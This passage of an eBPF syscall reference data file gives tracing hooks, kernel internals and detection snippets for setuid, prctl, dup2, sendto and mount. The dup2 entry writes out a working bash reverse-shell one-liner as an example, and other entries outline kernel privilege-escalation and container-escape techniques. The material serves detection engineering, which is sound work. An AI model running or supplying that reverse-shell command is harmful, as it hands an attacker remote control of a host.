      'Crucial Security Insight: Kernel privilege-escalation exploits (such as DirtyPipe or netfilter use-after-free bugs) often bypass the setuid() syscall entirely by calling commit_creds(prepare_kernel_cred(0)) directly in kernel space! Therefore, hooking BOTH sys_enter_setuid AND fentry/commit_creds catches both legitimate sudo transitions and kernel exploit privilege escalations.'
    ],
    kernelInternalsAndStructures: [
      'struct cred (immutable RCU structure holding uid, gid, euid, egid, cap_effective)',
      'prepare_creds() & commit_creds(struct cred *new) in kernel/cred.c'
    ],
    howToTraceInEbpf: [
      'In sys_enter_setuid, compare current UID (bpf_get_current_uid_gid() & 0xFFFFFFFF) against the requested target UID ((uid_t)ctx->args[0]).',
      'Even better, hook SEC("kprobe/commit_creds") or SEC("fentry/commit_creds") and compare current->real_cred->euid with new->euid using BPF_CORE_READ(). If current euid != 0 and new euid == 0, a non-root task just became root!'
    ],
    pointerAndVerifierGotchas: [
      'In struct cred, uid and euid are wrapped inside struct kuid_t { uid_t val; }. Use BPF_CORE_READ(cred, euid.val) to read the 32-bit integer value cleanly across kernel versions.'
    ],
    returnValuesAndErrnos: {
      successMeaning: 'Returns 0 when the process credentials are updated.',
      commonErrors: [
        { errno: '-EPERM (-1)', reason: 'Unprivileged process attempted to switch to an arbitrary UID without CAP_SETUID.' },
        { errno: '-EAGAIN (-11)', reason: 'Target UID has reached its RLIMIT_NPROC process limit.' }
      ]
    },
    arguments: [
      {
        argIndex: 'ctx->args[0]',
        name: 'uid',
        cType: 'uid_t',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar)',
        detailedMeaning: 'Target User ID (0 = root) requested by the calling thread.'
      }
    ],
    securityAndObservabilityUseCases: [
      {
        title: 'Root Privilege Escalation Detection (Syscall + commit_creds)',
        scenario: 'Detecting any container process transitioning from a non-zero UID to UID 0 (root).'
      }
    ],
    cSnippet: `SEC("kprobe/commit_creds")
int BPF_KPROBE(trace_commit_creds, struct cred *new_cred) {
    __u32 old_uid = bpf_get_current_uid_gid() & 0xFFFFFFFF;
    __u32 new_euid = BPF_CORE_READ(new_cred, euid.val);

    // Detect non-root process escalating to root (UID 0)
    if (old_uid != 0 && new_euid == 0) {
        bpf_printk("PRIV_ESC ALERT: pid=%d escalated UID %d -> 0!\\n",
                   bpf_get_current_pid_tgid() >> 32, old_uid);
    }
    return 0;
}`,
    goSnippet: `kp, err := link.Kprobe("commit_creds", objs.TraceCommitCreds, nil)
if err != nil {
    log.Fatalf("attaching commit_creds: %v", err)
}
defer kp.Close()`
  },

  {
    id: 'sys-prctl',
    syscallNumberX86_64: 157,
    name: 'prctl',
    category: 'Process & Execution',
    cSignature: 'int prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5);',
    enterTracepoint: 'SEC("tracepoint/syscalls/sys_enter_prctl")',
    exitTracepoint: 'SEC("tracepoint/syscalls/sys_exit_prctl")',
    fentryHook: 'SEC("fentry/__x64_sys_prctl")',
    lsmAlternative: 'SEC("lsm/task_prctl")',
    shortSummary:
      'Manipulates process/thread attributes including thread name (PR_SET_NAME), seccomp filters, capability ambient sets, and dumpable flags.',
    whatItDoesInDetail: [
      'prctl() (Process Control) is a Swiss-Army-knife system call that modifies behavior on the calling thread’s struct task_struct or struct cred based on the option selector in ctx->args[0].',
      'Two prctl options are especially important for eBPF engineers and security teams: PR_SET_NAME (15), which overwrites the 16-byte current->comm process name (commonly used by malware to masquerade as "[kworker/0:1]" or "systemd"), and PR_SET_DUMPABLE (4), which controls whether core dumps and ptrace attachments are permitted.',
      'Additionally, container runtimes use prctl(PR_SET_NO_NEW_PRIVS, 1) and prctl(PR_SET_SECCOMP) before execve() to lock down container processes.'
    ],
    kernelInternalsAndStructures: [
      'PR_SET_NAME (15) — calls set_task_comm(current, (char __user *)arg2) to mutate current->comm',
      'PR_SET_NO_NEW_PRIVS (38) — prevents setuid binaries from granting new privileges across execve',
      'PR_CAP_AMBIENT (47) — modifies ambient Linux capabilities'
    ],
    howToTraceInEbpf: [
      'Hook SEC("tracepoint/syscalls/sys_enter_prctl") and check int option = (int)ctx->args[0].',
      'When option == 15 (PR_SET_NAME), record the old process comm via bpf_get_current_comm() BEFORE the kernel updates it, and read the new disguised name from (const char *)ctx->args[1] via bpf_probe_read_user_str()!'
    ],
    pointerAndVerifierGotchas: [
      'Depending on option, ctx->args[1] (arg2) can be EITHER a scalar integer (e.g., for PR_SET_DUMPABLE) OR a user-space string pointer (for PR_SET_NAME == 15). Only call bpf_probe_read_user_str() after checking option == 15!'
    ],
    returnValuesAndErrnos: {
      successMeaning: 'Returns 0 (or the queried boolean/integer value for PR_GET_* options).',
      commonErrors: [
        { errno: '-EINVAL (-22)', reason: 'Unrecognized option code or invalid flags.' },
        { errno: '-EPERM (-1)', reason: 'Caller lacks required capability for privileged prctl subcommands.' }
      ]
    },
    arguments: [
      {
        argIndex: 'ctx->args[0]',
        name: 'option',
        cType: 'int',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar)',
        detailedMeaning: 'Selector constant: PR_SET_NAME (15), PR_SET_SECCOMP (22), PR_SET_NO_NEW_PRIVS (38).'
      },
      {
        argIndex: 'ctx->args[1]',
        name: 'arg2',
        cType: 'unsigned long / const char __user *',
        pointerSpace: 'USER_POINTER (__user)',
        helperRequired: 'bpf_probe_read_user_str() when option == 15',
        detailedMeaning: 'Option-dependent argument (for PR_SET_NAME, a 16-byte user string).'
      }
    ],
    securityAndObservabilityUseCases: [
      {
        title: 'Process Masquerading Detection (PR_SET_NAME)',
        scenario: 'Catching crypto-miners or rootkits renaming their process comm to look like a kernel thread (e.g. "[kthreadd]" or "sshd").'
      }
    ],
    cSnippet: `SEC("tracepoint/syscalls/sys_enter_prctl")
int trace_prctl(struct trace_event_raw_sys_enter *ctx) {
    int option = (int)ctx->args[0];

    // 15 == PR_SET_NAME (process renaming its current->comm)
    if (option == 15) {
        char old_comm[16], new_comm[16];
        bpf_get_current_comm(&old_comm, sizeof(old_comm));
        bpf_probe_read_user_str(&new_comm, sizeof(new_comm), (const char *)ctx->args[1]);
        bpf_printk("COMM MASQUERADE: pid=%d renamed '%s' -> '%s'\\n",
                   bpf_get_current_pid_tgid() >> 32, old_comm, new_comm);
    }
    return 0;
}`,
    goSnippet: `tp, err := link.Tracepoint("syscalls", "sys_enter_prctl", objs.TracePrctl, nil)
if err != nil {
    log.Fatalf("attaching sys_enter_prctl: %v", err)
}
defer tp.Close()`
  },

  {
    id: 'sys-dup2-dup3',
    syscallNumberX86_64: 33,
    name: 'dup2 / dup3',
    category: 'Filesystem & VFS',
    cSignature: 'int dup2(int oldfd, int newfd); // dup3 is syscall #292',
    enterTracepoint: 'SEC("tracepoint/syscalls/sys_enter_dup2")',
    exitTracepoint: 'SEC("tracepoint/syscalls/sys_exit_dup2")',
    fentryHook: 'SEC("fentry/ksys_dup3")',
    lsmAlternative: 'SEC("lsm/file_permission")',
    shortSummary:
      'Duplicates an open file descriptor onto a specific target FD slot (such as stdin=0, stdout=1, stderr=2), closing any previous file at newfd.',
    whatItDoesInDetail: [
      'dup2(oldfd, newfd) and dup3(oldfd, newfd, flags) make the file descriptor integer newfd point to the exact same open kernel struct file * as oldfd, incrementing its f_count reference counter.',
      'Shell pipelines (ls | grep) use dup2() to wire stdout (FD 1) of one process to the write end of a pipe. Crucially, almost every Linux reverse shell (e.g., bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 or Python/Perl/Socat reverse shells) works by opening a TCP socket (say FD 3), calling dup2(3, 0), dup2(3, 1), and dup2(3, 2) to attach stdin/stdout/stderr directly to the network socket, and then calling execve("/bin/sh")!',
      'Therefore, tracing dup2/dup3 where newfd is 0, 1, or 2 and oldfd is a network socket is one of the highest-signal, lowest-false-positive reverse shell detectors in existence.'
    ],
    kernelInternalsAndStructures: [
      'ksys_dup3(unsigned int oldfd, unsigned int newfd, int flags) in fs/file.c',
      'do_dup2() (replaces current->files->fdt->fd[newfd] with the struct file * from oldfd)'
    ],
    howToTraceInEbpf: [
      'Hook SEC("tracepoint/syscalls/sys_enter_dup2") and SEC("tracepoint/syscalls/sys_enter_dup3") (or unify both by hooking SEC("fentry/ksys_dup3")).',
      'Inspect unsigned int oldfd = ctx->args[0] and unsigned int newfd = ctx->args[1]. If newfd <= 2 (stdin/stdout/stderr) and oldfd > 2, correlate whether oldfd was created by socket()/connect().'
    ],
    pointerAndVerifierGotchas: [
      'On ARM64 Linux, the legacy dup2 syscall does not exist—libc translates dup2(oldfd, newfd) into dup3(oldfd, newfd, 0). Always hook both sys_enter_dup2 and sys_enter_dup3, or hook ksys_dup3!'
    ],
    returnValuesAndErrnos: {
      successMeaning: 'Returns the new file descriptor integer (newfd) on success.',
      commonErrors: [
        { errno: '-EBADF (-9)', reason: 'oldfd is not an open file descriptor, or newfd is out of range.' }
      ]
    },
    arguments: [
      {
        argIndex: 'ctx->args[0]',
        name: 'oldfd',
        cType: 'unsigned int',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar)',
        detailedMeaning: 'Existing open file or socket descriptor to duplicate.'
      },
      {
        argIndex: 'ctx->args[1]',
        name: 'newfd',
        cType: 'unsigned int',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar)',
        detailedMeaning: 'Target descriptor number (0=stdin, 1=stdout, 2=stderr).'
      }
    ],
    securityAndObservabilityUseCases: [
      {
        title: 'High-Precision Reverse Shell Detection',
        scenario: 'Detecting any process duplicating a connected TCP socket FD onto stdin (0), stdout (1), or stderr (2) prior to spawning a shell.'
      }
    ],
    cSnippet: `SEC("tracepoint/syscalls/sys_enter_dup2")
int trace_dup2(struct trace_event_raw_sys_enter *ctx) {
    __u32 oldfd = (__u32)ctx->args[0];
    __u32 newfd = (__u32)ctx->args[1];

    // Check if redirecting stdio (0, 1, 2) to another descriptor
    if (newfd <= 2 && oldfd > 2) {
        bpf_printk("STDIO REDIRECT: pid=%d dup2(oldfd=%d -> stdio=%d)\\n",
                   bpf_get_current_pid_tgid() >> 32, oldfd, newfd);
    }
    return 0;
}`,
    goSnippet: `tp, err := link.Tracepoint("syscalls", "sys_enter_dup2", objs.TraceDup2, nil)
if err != nil {
    log.Fatalf("attaching sys_enter_dup2: %v", err)
}
defer tp.Close()`
  },

  {
    id: 'sys-sendto-recvfrom',
    syscallNumberX86_64: 44,
    name: 'sendto / recvfrom',
    category: 'Network & Sockets',
    cSignature: 'ssize_t sendto(int sockfd, const void *buf, size_t len, int flags, const struct sockaddr *dest_addr, socklen_t addrlen);',
    enterTracepoint: 'SEC("tracepoint/syscalls/sys_enter_sendto")',
    exitTracepoint: 'SEC("tracepoint/syscalls/sys_exit_sendto")',
    fentryHook: 'SEC("fentry/__sys_sendto")',
    lsmAlternative: 'SEC("lsm/socket_sendmsg")',
    shortSummary:
      'Transmits or receives a message payload over a socket, optionally specifying an explicit destination/source sockaddr (used heavily by UDP & DNS).',
    whatItDoesInDetail: [
      'While connected TCP streams often use read()/write(), connectionless UDP sockets—most notably DNS resolvers querying port 53—use sendto() (syscall #44) and recvfrom() (syscall #45) to pass both the packet payload buffer and the target struct sockaddr_in in a single system call.',
      'Inside the kernel, __sys_sendto() constructs a struct msghdr and struct iovec wrapping the user buffer, copies the optional dest_addr into kernel space, and calls sock_sendmsg().'
    ],
    kernelInternalsAndStructures: [
      'struct msghdr (kernel message header wrapping iovec segments and msg_name sockaddr)',
      'sock_sendmsg() & udp_sendmsg() / tcp_sendmsg()'
    ],
    howToTraceInEbpf: [
      'In sys_enter_sendto, ctx->args[1] is the payload buffer and ctx->args[4] is const struct sockaddr __user *dest_addr. Note that on connected TCP sockets, dest_addr (args[4]) is NULL! Always check if (dest_addr != NULL) before reading the destination IP/port.'
    ],
    pointerAndVerifierGotchas: [
      'sendto() uses all 6 syscall argument slots (args[0] through args[5]). Remember that dest_addr is at ctx->args[4], and it is NULL when send() is called on an already-connected socket.'
    ],
    returnValuesAndErrnos: {
      successMeaning: 'Returns the number of bytes sent or received.',
      commonErrors: [
        { errno: '-EAGAIN (-11)', reason: 'Socket send/receive buffer is full/empty on a non-blocking socket.' },
        { errno: '-EMSGSIZE (-90)', reason: 'UDP datagram size exceeds the maximum atomic packet size.' }
      ]
    },
    arguments: [
      {
        argIndex: 'ctx->args[0]',
        name: 'sockfd',
        cType: 'int',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar)',
        detailedMeaning: 'Socket file descriptor.'
      },
      {
        argIndex: 'ctx->args[1]',
        name: 'buf',
        cType: 'const void __user *',
        pointerSpace: 'USER_POINTER (__user)',
        helperRequired: 'bpf_probe_read_user()',
        detailedMeaning: 'User-space message buffer (populated at sys_enter for sendto, or sys_exit for recvfrom).'
      },
      {
        argIndex: 'ctx->args[2]',
        name: 'len',
        cType: 'size_t',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar)',
        detailedMeaning: 'Byte length of the message buffer.'
      },
      {
        argIndex: 'ctx->args[4]',
        name: 'dest_addr',
        cType: 'const struct sockaddr __user *',
        pointerSpace: 'USER_STRUCT_PTR (__user)',
        helperRequired: 'bpf_probe_read_user()',
        detailedMeaning: 'Optional target sockaddr_in / sockaddr_in6 for unconnected UDP sockets.'
      }
    ],
    securityAndObservabilityUseCases: [
      {
        title: 'Per-Process DNS Query & Exfiltration Attribution',
        scenario: 'Inspecting sendto() calls to UDP port 53 to attribute every DNS lookup to the exact PID and binary that initiated it.'
      }
    ],
    cSnippet: `SEC("tracepoint/syscalls/sys_enter_sendto")
int trace_sendto(struct trace_event_raw_sys_enter *ctx) {
    size_t len = (size_t)ctx->args[2];
    const void *dest_addr = (const void *)ctx->args[4];
    if (!dest_addr) return 0;

    __u16 family = 0, dport_be = 0;
    bpf_probe_read_user(&family, sizeof(family), dest_addr);
    bpf_probe_read_user(&dport_be, sizeof(dport_be), (const char *)dest_addr + 2);

    if (family == 2 && __builtin_bswap16(dport_be) == 53) {
        bpf_printk("DNS Query sent by pid=%d bytes=%lu\\n",
                   bpf_get_current_pid_tgid() >> 32, len);
    }
    return 0;
}`,
    goSnippet: `tp, err := link.Tracepoint("syscalls", "sys_enter_sendto", objs.TraceSendto, nil)
if err != nil {
    log.Fatalf("attaching sys_enter_sendto: %v", err)
}
defer tp.Close()`
  },

  {
    id: 'sys-mount-init-module',
    syscallNumberX86_64: 165,
    name: 'mount & finit_module',
    category: 'Memory, Privilege & Security',
    cSignature: 'int mount(const char *source, const char *target, const char *filesystemtype, unsigned long mountflags, const void *data);',
    enterTracepoint: 'SEC("tracepoint/syscalls/sys_enter_mount")',
    exitTracepoint: 'SEC("tracepoint/syscalls/sys_exit_mount")',
    fentryHook: 'SEC("fentry/__x64_sys_mount")',
    lsmAlternative: 'SEC("lsm/sb_mount") / SEC("lsm/kernel_read_file")',
    shortSummary:
      'mount() attaches a filesystem to the VFS hierarchy, while finit_module() (#313) loads a compiled .ko kernel module into Ring 0.',
    whatItDoesInDetail: [
      'mount() (#165) and finit_module() (#313) are high-impact administrative system calls that should almost NEVER be invoked inside a running application container.',
      'In container escape attacks (such as privileged container breakouts or cgroup release_agent exploits), attackers call mount() to mount the host root disk (/dev/sda1) or cgroupfs inside the container, or call finit_module() / init_module() (#175) to insert a Ring 0 LKM rootkit.',
      'Monitoring both syscalls provides immediate, zero-noise alerting on container breakout attempts.'
    ],
    kernelInternalsAndStructures: [
      'path_mount() in fs/namespace.c (attaches struct vfsmount to mountpoint dentry)',
      'load_module() in kernel/module/main.c (parses ELF .ko module and links into kernel)'
    ],
    howToTraceInEbpf: [
      'Hook SEC("tracepoint/syscalls/sys_enter_mount") and read source (ctx->args[0]), target (ctx->args[1]), and filesystemtype (ctx->args[2]) using bpf_probe_read_user_str().',
      'Hook SEC("tracepoint/syscalls/sys_enter_finit_module") to alert on any attempt to load a Linux Kernel Module.'
    ],
    pointerAndVerifierGotchas: [
      'For bind mounts or remounts (MS_BIND / MS_REMOUNT), source or filesystemtype may be NULL pointers in user space—bpf_probe_read_user_str() safely writes an empty string "" and returns -EFAULT if a user pointer is NULL.'
    ],
    returnValuesAndErrnos: {
      successMeaning: 'Returns 0 when the filesystem is mounted or kernel module is initialized.',
      commonErrors: [
        { errno: '-EPERM (-1)', reason: 'Caller lacks CAP_SYS_ADMIN (for mount) or CAP_SYS_MODULE (for finit_module).' }
      ]
    },
    arguments: [
      {
        argIndex: 'ctx->args[0]',
        name: 'source',
        cType: 'const char __user *',
        pointerSpace: 'USER_POINTER (__user)',
        helperRequired: 'bpf_probe_read_user_str()',
        detailedMeaning: 'Block device path (e.g. "/dev/sda1") or source directory for bind mounts.'
      },
      {
        argIndex: 'ctx->args[1]',
        name: 'target',
        cType: 'const char __user *',
        pointerSpace: 'USER_POINTER (__user)',
        helperRequired: 'bpf_probe_read_user_str()',
        detailedMeaning: 'Destination mountpoint directory path.'
      },
      {
        argIndex: 'ctx->args[2]',
        name: 'filesystemtype',
        cType: 'const char __user *',
        pointerSpace: 'USER_POINTER (__user)',
        helperRequired: 'bpf_probe_read_user_str()',
        detailedMeaning: 'Filesystem driver name ("ext4", "xfs", "overlay", "cgroup2", "proc").'
      },
      {
        argIndex: 'ctx->args[3]',
        name: 'mountflags',
        cType: 'unsigned long',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar)',
        detailedMeaning: 'Flags bitmask: MS_RDONLY (1), MS_NOSUID (2), MS_NOEXEC (8), MS_BIND (4096).'
      }
    ],
    securityAndObservabilityUseCases: [
      {
        title: 'Container Escape & Host Filesystem Mount Detection',
        scenario: 'Alerting immediately when a container process invokes mount() or attempts to load a kernel module via finit_module().'
      }
    ],
    cSnippet: `SEC("tracepoint/syscalls/sys_enter_mount")
int trace_mount(struct trace_event_raw_sys_enter *ctx) {
    char target[64], fstype[32];
    bpf_probe_read_user_str(&target, sizeof(target), (const char *)ctx->args[1]);
    bpf_probe_read_user_str(&fstype, sizeof(fstype), (const char *)ctx->args[2]);

    bpf_printk("MOUNT ALERT: pid=%d mounting type=%s on %s\\n",
               bpf_get_current_pid_tgid() >> 32, fstype, target);
    return 0;
}`,
    goSnippet: `tp, err := link.Tracepoint("syscalls", "sys_enter_mount", objs.TraceMount, nil)
if err != nil {
    log.Fatalf("attaching sys_enter_mount: %v", err)
}
defer tp.Close()`
  }
];

